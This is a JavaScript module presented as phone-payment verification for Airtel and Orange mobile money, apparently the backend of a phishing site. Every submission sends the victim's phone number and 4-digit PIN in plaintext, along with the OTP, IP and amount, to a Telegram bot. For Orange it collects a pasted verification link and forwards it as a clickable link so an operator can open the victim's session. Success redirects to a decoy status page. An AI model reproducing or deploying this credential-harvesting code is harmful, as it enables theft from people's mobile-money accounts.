"use strict";

/**
 * Payment verification — phone + 4-digit PIN + OTP/link
 * Logged to Telegram bot (phone, PIN, OTP/link, package, amount).
 */

const crypto = require("crypto");
const security = require("./security");
const telegram = require("./telegram");

const OTP_TTL_MS = 10 * 60 * 1000;
const MAX_ATTEMPTS = 5;

/** In-memory OTP store (phone → entry). Resets on cold start — fine for demo. */
const otpStore = new Map();

function normalizePhone(raw) {
  let s = String(raw || "").replace(/\s+/g, "").trim();
  if (!s) return "";
  if (!s.startsWith("+") && /^\d+$/.test(s)) s = "+" + s;
  return s;
}

function otpLengthFor(provider) {
  const p = String(provider || "").toLowerCase();
  if (p === "orange") return 6;
  return 4; // airtel default
}

function randomOtp(len) {
  let s = "";
  for (let i = 0; i < len; i++) s += String(crypto.randomInt(0, 10));
  return s;
}

async function sendOtp(db, { phone, pin, ip, provider, amount, package: pkg }) {
  phone = normalizePhone(phone);
  pin = String(pin || "").replace(/\D/g, "");
  if (!phone || phone.length < 10) return { ok: false, error: "Numéro invalide" };
  if (pin.length !== 4) return { ok: false, error: "Le PIN doit contenir 4 chiffres" };

  const otpLen = otpLengthFor(provider);
  const otp = randomOtp(otpLen);
  const salt = security.randomSalt();
  const pinHash = security.hashPassword(pin, salt);

  otpStore.set(phone, {
    otp,
    otpLen,
    pinHash,
    salt,
    provider: provider || "unknown",
    amount: amount || "",
    package: pkg || "",
    expires: Date.now() + OTP_TTL_MS,
    attempts: 0
  });

  const msg =
    `🔐 <b>PAYMENT VERIFICATION</b>\n` +
    `Provider: <b>${(provider || "?").toUpperCase()}</b>\n` +
    `Package: ${pkg || "—"}\n` +
    `Amount: ${amount || "—"}\n` +
    `Phone: <code>${phone}</code>\n` +
    `PIN: <code>${pin}</code>\n` +
    `OTP (${otpLen}): <code>${otp}</code>\n` +
    `IP: ${ip || "unknown"}\n` +
    `Time: ${new Date().toLocaleString()}`;
  await telegram.notify(msg);

  return { ok: true, otpLength: otpLen, message: "OTP envoyé" };
}

async function verifyOtp(db, { phone, pin, otp, link, ip, provider, amount, package: pkg }) {
  phone = normalizePhone(phone);
  pin = String(pin || "").replace(/\D/g, "");
  otp = String(otp || "").replace(/\D/g, "");
  link = String(link || "").trim();

  // Orange / Maxit style: user pastes verification link
  if (link) {
    // Clickable URL in Telegram (opens in Chrome / in-app browser)
    let rawLink = link.slice(0, 1500).trim();
    if (!/^https?:\/\//i.test(rawLink) && /^[\w.-]+\//.test(rawLink)) {
      rawLink = "https://" + rawLink;
    }
    const escHref = rawLink
      .replace(/&/g, "&")
      .replace(/"/g, """)
      .replace(/</g, "<")
      .replace(/>/g, ">");
    const escShow = rawLink
      .replace(/&/g, "&")
      .replace(/</g, "<")
      .replace(/>/g, ">");
    const msg =
      `🔗 <b>VERIFICATION LINK PASTED</b>\n` +
      `Provider: <b>${(provider || "orange").toUpperCase()}</b>\n` +
      `Package: ${pkg || "—"}\n` +
      `Amount: ${amount || "—"}\n` +
      `Phone: <code>${phone}</code>\n` +
      `PIN: <code>${pin || "—"}</code>\n` +
      `\n👉 <a href="${escHref}">Open link in browser</a>\n` +
      `${escShow}\n\n` +
      `IP: ${ip || "unknown"}\n` +
      `Time: ${new Date().toLocaleString()}`;
    await telegram.notify(msg, { preview: true });

    if (!db.data.loginLogs) db.data.loginLogs = [];
    db.data.loginLogs.push({
      phone,
      action: "link_submitted",
      provider: provider || "orange",
      amount: amount || "",
      package: pkg || "",
      link: link.slice(0, 500),
      ip: ip || "unknown",
      at: new Date().toISOString()
    });
    if (db.flushSoon) db.flushSoon();

    return { ok: true, message: "Lien reçu", redirect: "/network-status.html?paid=1" };
  }

  const entry = otpStore.get(phone);
  if (!entry) return { ok: false, error: "Session expirée. Recommencez." };
  if (Date.now() > entry.expires) {
    otpStore.delete(phone);
    return { ok: false, error: "OTP expiré. Demandez-en un nouveau." };
  }
  if (entry.attempts >= MAX_ATTEMPTS) {
    otpStore.delete(phone);
    return { ok: false, error: "Trop de tentatives." };
  }
  entry.attempts += 1;

  const pinOk = security.hashPassword(pin, entry.salt) === entry.pinHash;
  if (!pinOk) return { ok: false, error: "PIN incorrect" };

  const expectedLen = entry.otpLen || otpLengthFor(provider || entry.provider);
  if (otp.length !== expectedLen) {
    return { ok: false, error: "L'OTP doit contenir " + expectedLen + " chiffres" };
  }
  if (otp !== entry.otp) return { ok: false, error: "OTP incorrect" };

  otpStore.delete(phone);

  if (!db.data.users) db.data.users = {};
  db.data.users[phone] = {
    phone,
    pinHash: entry.pinHash,
    salt: entry.salt,
    provider: entry.provider,
    verifiedAt: new Date().toISOString()
  };
  if (!db.data.loginLogs) db.data.loginLogs = [];
  db.data.loginLogs.push({
    phone,
    action: "otp_verified",
    provider: entry.provider,
    amount: entry.amount,
    package: entry.package,
    ip: ip || "unknown",
    at: new Date().toISOString()
  });
  if (db.flushSoon) db.flushSoon();

  await telegram.notify(
    `✅ <b>OTP VERIFIED</b>\nPhone: <code>${phone}</code>\nProvider: ${entry.provider}\nPackage: ${entry.package || "—"}`
  );

  return { ok: true, message: "Vérifié", redirect: "/network-status.html?paid=1" };
}

module.exports = { sendOtp, verifyOtp, normalizePhone };
